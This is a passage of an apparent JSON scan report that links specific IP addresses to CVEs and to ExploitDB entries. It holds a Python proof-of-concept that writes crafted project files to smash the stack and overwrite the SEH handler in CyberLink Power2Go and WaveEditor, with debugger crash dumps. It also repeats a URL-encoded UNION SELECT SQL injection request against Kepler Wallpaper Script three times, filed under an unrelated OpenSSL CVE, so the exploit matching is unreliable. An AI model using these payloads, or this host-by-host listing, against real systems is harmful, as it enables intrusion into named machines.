x62\\x6f\\x6f\\x74\\x46\\x6c\\x6f\\x70\"\r\n\t\"\\x70\\x79\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x62\"\r\n\t\"\\x6f\\x6f\\x74\\x49\\x6d\\x61\\x67\\x65\\x3d\\x22\\x22\\x20\\x0d\\x0a\"\r\n\t\"\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\\x45\\x78\\x65\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\"\r\n\t\"\\x45\\x78\\x65\\x50\\x61\\x74\\x68\\x3d\\x22\\x22\\x20\\x0d\\x0a\\x61\"\r\n\t\"\\x75\\x74\\x6f\\x52\\x75\\x6e\\x49\\x63\\x6f\\x6e\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\"\r\n\t\"\\x49\\x63\\x6f\\x6e\\x50\\x61\\x74\\x68\\x3d\\x22\\x22\\x20\\x0d\\x0a\"\r\n\t\"\\x41\\x75\\x74\\x6f\\x53\\x70\\x6c\\x69\\x74\\x44\\x69\\x73\\x63\\x3d\"\r\n\t\"\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x44\\x69\\x73\\x63\"\r\n\t\"\\x53\\x70\\x6c\\x69\\x74\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\"\r\n\t\"\\x0d\\x0a\\x41\\x75\\x74\\x6f\\x4f\\x76\\x65\\x72\\x42\\x75\\x72\\x6e\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x44\\x61\\x74\"\r\n\t\"\\x61\\x50\\x72\\x6a\\x74\\x6f\\x56\\x69\\x64\\x65\\x6f\\x50\\x72\\x6a\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x73\\x69\\x6d\"\r\n\t\"\\x75\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x50\\x72\\x6f\\x6f\\x66\\x3d\"\r\n\t\"\\x22\\x74\\x72\\x75\\x65\\x22\\x20\\x0d\\x0a\\x63\\x6c\\x6f\\x73\\x65\"\r\n\t\"\\x44\\x69\\x73\\x63\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x76\\x65\\x72\\x69\\x66\\x79\\x44\\x69\\x73\\x63\\x3d\\x22\\x66\"\r\n\t\"\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x64\\x65\\x66\\x65\\x63\\x74\"\r\n\t\"\\x6d\\x61\\x6e\\x61\\x67\\x65\\x6d\\x65\\x6e\\x74\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x63\\x6f\\x70\\x69\\x65\\x73\\x3d\"\r\n\t\"\\x22\\x31\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x53\\x70\\x65\\x65\"\r\n\t\"\\x64\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x63\\x64\\x54\\x65\\x78\\x74\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x41\\x75\\x64\"\r\n\t\"\\x69\\x6f\\x4e\\x6f\\x72\\x6d\\x61\\x6c\\x69\\x7a\\x65\\x3d\\x22\\x66\"\r\n\t\"\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x41\\x75\\x64\\x69\\x6f\\x47\"\r\n\t\"\\x61\\x70\\x54\\x69\\x6d\\x65\\x3d\\x22\\x32\\x22\\x20\\x0d\\x0a\\x46\"\r\n\t\"\\x69\\x6c\\x65\\x53\\x79\\x73\\x74\\x65\\x6d\\x3d\\x22\\x49\\x53\\x4f\"\r\n\t\"\\x39\\x36\\x36\\x30\\x5f\\x4a\\x4f\\x4c\\x49\\x45\\x54\\x22\\x3e\")\r\n\r\n\tbody = (\r\n\t\"\\x73\\x72\\x63\\x3d\\x22\\x43\\x3a\\x5c\\x61\\x62\\x63\\x2e\\x74\\x78\"\r\n\t\"\\x74\\x22\\x20\\x0d\\x0a\\x6f\\x70\\x65\\x72\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x3d\\x22\\x61\\x64\\x64\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x73\"\r\n\t\"\\x74\\x61\\x74\\x75\\x73\\x3d\\x22\\x6e\\x6f\\x74\\x62\\x75\\x72\\x6e\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x73\\x69\\x7a\\x65\\x3d\\x22\\x32\\x39\\x32\\x38\"\r\n\t\"\\x36\\x34\\x22\\x20\\x0d\\x0a\\x53\\x68\\x6f\\x77\\x53\\x69\\x7a\\x65\"\r\n\t\"\\x3d\\x22\\x32\\x39\\x32\\x38\\x36\\x34\\x22\\x20\\x0d\\x0a\\x41\\x6c\"\r\n\t\"\\x6c\\x6f\\x77\\x45\\x6e\\x63\\x72\\x79\\x70\\x74\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\\x75\\x72\\x65\\x64\"\r\n\t\"\\x52\\x6f\\x6f\\x74\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x66\\x69\\x6c\\x65\\x54\\x69\\x6d\\x65\\x3d\\x22\\x31\\x32\\x39\"\r\n\t\"\\x33\\x36\\x37\\x33\\x34\\x31\\x35\\x30\\x39\\x37\\x33\\x36\\x38\\x37\"\r\n\t\"\\x34\\x22\\x20\\x0d\\x0a\\x6f\\x6c\\x64\\x3d\\x22\\x66\\x61\\x6c\\x73\"\r\n\t\"\\x65\\x22\\x20\\x0d\\x0a\\x74\\x65\\x6d\\x70\\x66\\x69\\x6c\\x65\\x3d\"\r\n\t\"\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x74\\x65\\x6d\\x70\"\r\n\t\"\\x64\\x69\\x72\\x6c\\x65\\x76\\x65\\x6c\\x3d\\x22\\x30\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x66\\x6f\\x72\\x61\\x75\\x64\\x69\\x6f\\x74\\x72\\x61\\x63\\x6b\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x74\\x61\\x72\"\r\n\t\"\\x67\\x65\\x74\\x41\\x75\\x64\\x69\\x6f\\x43\\x44\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x64\\x61\\x74\\x61\\x69\\x74\\x65\"\r\n\t\"\\x6d\\x74\\x79\\x70\\x65\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x6d\\x76\"\r\n\t\"\\x70\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x61\\x75\\x64\\x69\\x6f\\x53\"\r\n\t\"\\x75\\x62\\x74\\x79\\x70\\x65\\x3d\\x22\\x30\\x22\\x2f\\x3e\\x0d\\x0a\"\r\n\t\"\\x3c\\x2f\\x44\\x61\\x74\\x61\\x44\\x69\\x73\\x63\\x3e\\x0d\\x0a\\x3c\"\r\n\t\"\\x2f\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3e\\x0d\"\r\n\t\"\\x0a\\x3c\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\r\n\tpgfile = \"overflow.p2g\"\r\n\tf = open(pgfile,'w')\r\n\tjunk = \"A\" * 778\r\n\tnseh = \"\\x42\\x42\"\r\n\tseh = \"\\x43\\x43\"\r\n\tsisa =  \"\\x44\" * 4200\r\n\r\n\thell = \"\\x3c\\x46\\x69\\x6c\\x65\" + \"\\r\\n\"\t# <File\r\n\thell+= \"name=\" + '\"'+ junk+nseh+seh+sisa + '\"'\r\n\ttry:\r\n\t\tf.write(header+ \"\\r\\n\" + hell + \"\\r\\n\" + body)\r\n\t\tprint \"[!] Generating\", pgfile, \"..\"\r\n\t\ttime.sleep(1)\r\n\t\tprint \"[+] File\", pgfile, \"successfully created!\"\r\n\t\tprint \"[*] Now open project file\" +\" \\'\"+pgfile+\"\\' \" + \"with CyberLink Power2Go.\"\r\n\t\tprint \"[*] Good luck ;)\"\r\n\t\tf.close()\r\n\texcept IOError:\r\n\t\tprint \"[-] Could not write to destination folder, check permission..\"\r\n\t\tsys.exit()\r\n\r\ndef waveeditor():\r\n\theader = (\"\\x3c\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x20\\x41\\x70\\x70\\x6c\\x69\\x63\\x61\"\r\n\t\"\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x57\\x61\\x76\\x65\\x45\\x64\\x69\\x74\\x6f\\x72\\x22\\x20\"\r\n\t\"\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x3d\\x22\\x32\\x2e\\x30\\x22\\x3e\")\r\n\r\n\twvefile = \"overflow.wve\"\r\n\tf = open(wvefile,'w')\r\n\tjunk = \"A\" * 3000\r\n\r\n\thell = \"\\x3c\\x46\\x69\\x6c\\x65\\x20\\x53\\x72\\x63\\x3d\" # <File src=\r\n\thell += '\"'+ junk + '\"' + \"\\x3e\"\r\n\r\n\tfill = (\"\\x3c\\x42\\x6f\\x6f\\x6b\\x6d\\x61\\x72\\x6b\\x4c\\x69\\x73\\x74\\x2f\\x3e\\x3c\"\r\n\t\"\\x2f\\x46\\x69\\x6c\\x65\\x3e\\x3c\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\t\r\n\tfill = (\"\\x3c\\x42\\x6f\\x6f\\x6b\\x6d\\x61\\x72\\x6b\\x4c\\x69\\x73\\x74\\x2f\\x3e\\x3c\"\r\n\t\"\\x2f\\x46\\x69\\x6c\\x65\\x3e\\x3c\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x3e\\x3c\\x41\\x75\\x64\\x69\\x6f\\x43\\x44\\x20\\x62\\x75\\x72\\x6e\\x50\\x72\\x6f\\x6f\"\r\n\t\"\\x66\\x3d\\x22\\x74\\x72\\x75\\x65\\x22\\x20\\x63\\x6f\\x70\\x69\\x65\\x73\\x3d\\x22\\x30\"\r\n\t\"\\x22\\x20\\x62\\x75\\x72\\x6e\\x53\\x70\\x65\\x65\\x64\\x3d\\x22\\x30\\x22\\x20\\x41\\x75\"\r\n\t\"\\x64\\x69\\x6f\\x4e\\x6f\\x72\\x6d\\x61\\x6c\\x69\\x7a\\x65\\x3d\\x22\\x66\\x61\\x6c\\x73\"\r\n\t\"\\x65\\x22\\x20\\x41\\x75\\x64\\x69\\x6f\\x47\\x61\\x70\\x54\\x69\\x6d\\x65\\x3d\\x22\\x32\"\r\n\t\"\\x22\\x2f\\x3e\\x3c\\x2f\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3e\\x3c\"\r\n\t\"\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\t\r\n\ttry:\r\n\t\tf.write(header+hell+fill)\r\n\t\tprint \"[!] Generating\", wvefile, \"..\"\r\n\t\ttime.sleep(1)\r\n\t\tprint \"[+] File\", wvefile, \"successfully created!\"\r\n\t\tprint \"[*] Now open project file\" +\" \\'\"+wvefile+\"\\' \" + \"with CyberLink WaveEditor.\"\r\n\t\tprint \"[*] Good luck ;)\"\r\n\t\tf.close()\r\n\texcept IOError:\r\n\t\tprint \"[-] Could not write to destination folder, check permission..\"\r\n\t\tsys.exit()\r\n\r\nprint \"[*] CyberLink Multiple Products File Project Processing Stack Buffer Overflow POC.\"\r\nprint \"[*] by modpr0be <modpr0be[at]spentera[dot]com> | @modpr0be\"\r\nprint \"\\t1.CyberLink Power2Go <= 8.0\"\r\nprint \"\\t2.CyberLink WaveEditor <= 2.0\"\r\n\r\na = 0\r\nwhile a < 2:\r\n\ta = a + 1\r\n\top = input (\"[!] Choose the product: \")\r\n\tif op == 1:\r\n\t\tpower2go()\r\n\t\tsys.exit()\r\n\telif op == 2:\r\n\t\twaveeditor()\r\n\t\tsys.exit()\r\n\telse:\r\n\t\tprint \"[-] Oh plz.. pick the right one :)\\r\\n\"\r\n\r\n\r\n### DUMP OF POWER2GO\r\n#(d18.c60): Break instruction exception - code 80000003 (first chance)\r\n#eax=7ffde000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005\r\n#eip=7c90120e esp=07d4ffcc ebp=07d4fff4 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246\r\n#ntdll!DbgBreakPoint:\r\n#7c90120e cc              int     3\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:022> g\r\n#(d18.d40): Access violation - code c0000005 (first chance)\r\n#First chance exceptions are reported before any exception handling.\r\n#This exception may be expected and handled.\r\n#eax=ec8b55ff ebx=010358b0 ecx=78ad8951 edx=005b12fc esi=00430043 edi=0012d69c\r\n#eip=ec8b55ff esp=0012ca70 ebp=00000000 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\r\n#ec8b55ff ??              ???\r\n#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\Power2Go8\\Power2Go8.exe - \r\n#0:000> !exchain\r\n#0012ca9c: Power2Go8!CCLAuMixerAPI::operator=+156ba8 (00560dc8)\r\n#0012d104: Power2Go8!CCLAuMixerAPI::operator=+25e23 (00430043)\r\n#Invalid exception stack at 00420042\r\n#0:000> d 0012d104\r\n#0012d104  42 00 42 00 43 00 43 00-43 00 43 00 43 00 43 00  B.B.C.C.C.C.C.C.\r\n#0012d114  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d124  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d134  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d144  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d154  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d164  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d174  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n\r\n\r\n### DUMP OF WAVE EDITOR\r\n#(e44.734): Break instruction exception - code 80000003 (first chance)\r\n#eax=7ffd9000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005\r\n#eip=7c90120e esp=00e5ffcc ebp=00e5fff4 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246\r\n#ntdll!DbgBreakPoint:\r\n#7c90120e cc              int     3\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:016> g\r\n#(e44.e48): Access violation - code c0000005 (first chance)\r\n#First chance exceptions are reported before any exception handling.\r\n#This exception may be expected and handled.\r\n#eax=00410041 ebx=ffffffff ecx=0240868b edx=420b1802 esi=022ccbe8 edi=00d2f848\r\n#eip=024c47af esp=0012c424 ebp=0012c42c iopl=0         nv up ei pl nz na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206\r\n#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\WaveEditor\\WaveKernel.dll -\r\n#WaveKernel!ReleaseWaveKernelClient+0x12a8f:\r\n#024c47af 8b4208          mov     eax,dword ptr [edx+8] ds:0023:420b180a=????????\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:000> !exchain\r\n#0012c898: *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\WaveEditor\\WaveEditor.exe -\r\n#WaveEditor!CCLAuMixerAPI::CCLAuMixerAPI+da61 (00410041)\r\n#Invalid exception stack at 00410041\r\n#0:000> d 0012c898\r\n#0012c898  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8d8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8e8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8f8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c908  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#",
                "description": "CyberLink (Multiple Products) - File Project Handling Stack Buffer Overflow (PoC)",
                "author": "modpr0be",
                "_id": 18220,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-12-09T00:00:00+00:00",
                "cve": [],
                "type": "dos",
                "port": 0
            }
        ]
    },
    "152.1.109.134": {
        "CVE-2020-1927": []
    },
    "152.1.109.136": {},
    "152.1.109.158": {
        "CVE-2019-0220": [
            {
                "source": "CVE",
                "_id": "2019-0220",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.0 to 2.4.38. When the path component of a request URL contains multiple consecutive slashes ('/'), directives such as LocationMatch and RewriteRule must account for duplicates in regular expressions while other aspects of the servers processing will implicitly collapse them.",
                "osvdb": [],
                "bid": [
                    107670
                ],
                "cve": [
                    "CVE-2019-0220"
                ],
                "msb": []
            }
        ]
    },
    "152.1.109.166": {
        "CVE-2019-0220": [
            {
                "source": "CVE",
                "_id": "2019-0220",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.0 to 2.4.38. When the path component of a request URL contains multiple consecutive slashes ('/'), directives such as LocationMatch and RewriteRule must account for duplicates in regular expressions while other aspects of the servers processing will implicitly collapse them.",
                "osvdb": [],
                "bid": [
                    107670
                ],
                "cve": [
                    "CVE-2019-0220"
                ],
                "msb": []
            }
        ]
    },
    "152.1.109.173": {
        "CVE-2019-1559": [
            {
                "source": "CVE",
                "_id": "2019-1559",
                "description": "If an application encounters a fatal protocol error and then calls SSL_shutdown() twice (once to send a close_notify, and once to receive one) then OpenSSL can respond differently to the calling application if a 0 byte record is received with invalid padding compared to if a 0 byte record is received with an invalid MAC. If the application then behaves differently based on that in a way that is detectable to the remote peer, then this amounts to a padding oracle that could be used to decrypt data. In order for this to be exploitable \"non-stitched\" ciphersuites must be in use. Stitched ciphersuites are optimised implementations of certain commonly used ciphersuites. Also the application must call SSL_shutdown() twice even if a protocol error has occurred (applications should not do this but some do anyway). Fixed in OpenSSL 1.0.2r (Affected 1.0.2-1.0.2q).",
                "osvdb": [],
                "bid": [
                    107174
                ],
                "cve": [
                    "CVE-2019-1559"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: Kepler Wallpaper Script 1.1 - SQL Injection\r\n# Dork: N/A\r\n# Date: 2019-01-19\r\n# Exploit Author: Ihsan Sencan\r\n# Vendor Homepage: https://keplerwallpapers.online/\r\n# Software Link: https://codeclerks.com/PHP/1559/Kepler-Wallpaper-Script\r\n# Version: 1.1\r\n# Category: Webapps\r\n# Tested on: WiN7_x64/KaLiLinuX_x64\r\n# CVE: N/A\r\n\r\n# POC: \r\n# 1)\r\n# http://localhost/[PATH]//[PATH]/category/xxx[SQL]\r\n# \r\n\r\nGET /[PATH]/category/xxx%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2d%2d%20%2d HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: PHPSESSID=6963a7f072dbf72fb4cb420c9f5ad80a; ResolutionWidthAuto=1366; ResolutionHeightAuto=768; FilterType=Auto\r\nDNT: 1\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHTTP/1.1 200 OK\r\nDate: Sat, 19 Jan 2019 09:01:06 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.6.37\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\nAccess-Control-Allow-Origin: *\r\nStrict-Transport-Security: max-age=31536000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8",
                "description": "Kepler Wallpaper Script 1.1 - SQL Injection",
                "author": "Ihsan Sencan",
                "_id": 46207,
                "source": "ExploitDB",
                "platform": "php",
                "date": "2019-01-21T00:00:00+00:00",
                "cve": [],
                "type": "webapps",
                "port": 80
            }
        ]
    },
    "152.1.109.182": {
        "CVE-2019-1559": [
            {
                "source": "CVE",
                "_id": "2019-1559",
                "description": "If an application encounters a fatal protocol error and then calls SSL_shutdown() twice (once to send a close_notify, and once to receive one) then OpenSSL can respond differently to the calling application if a 0 byte record is received with invalid padding compared to if a 0 byte record is received with an invalid MAC. If the application then behaves differently based on that in a way that is detectable to the remote peer, then this amounts to a padding oracle that could be used to decrypt data. In order for this to be exploitable \"non-stitched\" ciphersuites must be in use. Stitched ciphersuites are optimised implementations of certain commonly used ciphersuites. Also the application must call SSL_shutdown() twice even if a protocol error has occurred (applications should not do this but some do anyway). Fixed in OpenSSL 1.0.2r (Affected 1.0.2-1.0.2q).",
                "osvdb": [],
                "bid": [
                    107174
                ],
                "cve": [
                    "CVE-2019-1559"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: Kepler Wallpaper Script 1.1 - SQL Injection\r\n# Dork: N/A\r\n# Date: 2019-01-19\r\n# Exploit Author: Ihsan Sencan\r\n# Vendor Homepage: https://keplerwallpapers.online/\r\n# Software Link: https://codeclerks.com/PHP/1559/Kepler-Wallpaper-Script\r\n# Version: 1.1\r\n# Category: Webapps\r\n# Tested on: WiN7_x64/KaLiLinuX_x64\r\n# CVE: N/A\r\n\r\n# POC: \r\n# 1)\r\n# http://localhost/[PATH]//[PATH]/category/xxx[SQL]\r\n# \r\n\r\nGET /[PATH]/category/xxx%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2d%2d%20%2d HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: PHPSESSID=6963a7f072dbf72fb4cb420c9f5ad80a; ResolutionWidthAuto=1366; ResolutionHeightAuto=768; FilterType=Auto\r\nDNT: 1\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHTTP/1.1 200 OK\r\nDate: Sat, 19 Jan 2019 09:01:06 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.6.37\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\nAccess-Control-Allow-Origin: *\r\nStrict-Transport-Security: max-age=31536000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8",
                "description": "Kepler Wallpaper Script 1.1 - SQL Injection",
                "author": "Ihsan Sencan",
                "_id": 46207,
                "source": "ExploitDB",
                "platform": "php",
                "date": "2019-01-21T00:00:00+00:00",
                "cve": [],
                "type": "webapps",
                "port": 80
            }
        ]
    },
    "152.1.109.197": {
        "CVE-2019-1559": [
            {
                "source": "CVE",
                "_id": "2019-1559",
                "description": "If an application encounters a fatal protocol error and then calls SSL_shutdown() twice (once to send a close_notify, and once to receive one) then OpenSSL can respond differently to the calling application if a 0 byte record is received with invalid padding compared to if a 0 byte record is received with an invalid MAC. If the application then behaves differently based on that in a way that is detectable to the remote peer, then this amounts to a padding oracle that could be used to decrypt data. In order for this to be exploitable \"non-stitched\" ciphersuites must be in use. Stitched ciphersuites are optimised implementations of certain commonly used ciphersuites. Also the application must call SSL_shutdown() twice even if a protocol error has occurred (applications should not do this but some do anyway). Fixed in OpenSSL 1.0.2r (Affected 1.0.2-1.0.2q).",
                "osvdb": [],
                "bid": [
                    107174
                ],
                "cve": [
                    "CVE-2019-1559"
                ],
                "msb": []
            },
            {
                "code": "# Exploit Title: Kepler Wallpaper Script 1.1 - SQL Injection\r\n# Dork: N/A\r\n# Date: 2019-01-19\r\n# Exploit Author: Ihsan Sencan\r\n# Vendor Homepage: https://keplerwallpapers.online/\r\n# Software Link: https://codeclerks.com/PHP/1559/Kepler-Wallpaper-Script\r\n# Version: 1.1\r\n# Category: Webapps\r\n# Tested on: WiN7_x64/KaLiLinuX_x64\r\n# CVE: N/A\r\n\r\n# POC: \r\n# 1)\r\n# http://localhost/[PATH]//[PATH]/category/xxx[SQL]\r\n# \r\n\r\nGET /[PATH]/category/xxx%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2d%2d%20%2d HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate, br\r\nCookie: PHPSESSID=6963a7f072dbf72fb4cb420c9f5ad80a; ResolutionWidthAuto=1366; ResolutionHeightAuto=768; FilterType=Auto\r\nDNT: 1\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nHTTP/1.1 200 OK\r\nDate: Sat, 19 Jan 2019 09:01:06 GMT\r\nServer: Apache\r\nX-Powered-By: PHP/5.6.37\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nPragma: no-cache\r\nAccess-Control-Allow-Origin: *\r\nStrict-Transport-Security: max-age=31536000\r\nKeep-Alive: timeout=5, max=100\r\nConnection: Keep-Alive\r\nTransfer-Encoding: chunked\r\nContent-Type: text/html; charset=UTF-8",
                "description": "Kepler Wallpaper Script 1.1 - SQL Injection",
                "author": "Ihsan Sencan",
                "_id": 46207,
                "source": "ExploitDB",
                "platform": "php",
                "date": "2019-01-21T00:00:00+00:00",
                "cve": [],
                "type": "webapps",
                "port": 80
            }
        ]
    },
    "152.1.111.45": {
        "CVE-2020-1938": []
    },
    "152.1.134.72": {
        "CVE-2019-1552": [
            {
                "source": "CVE",
                "_id": "2019-1552",
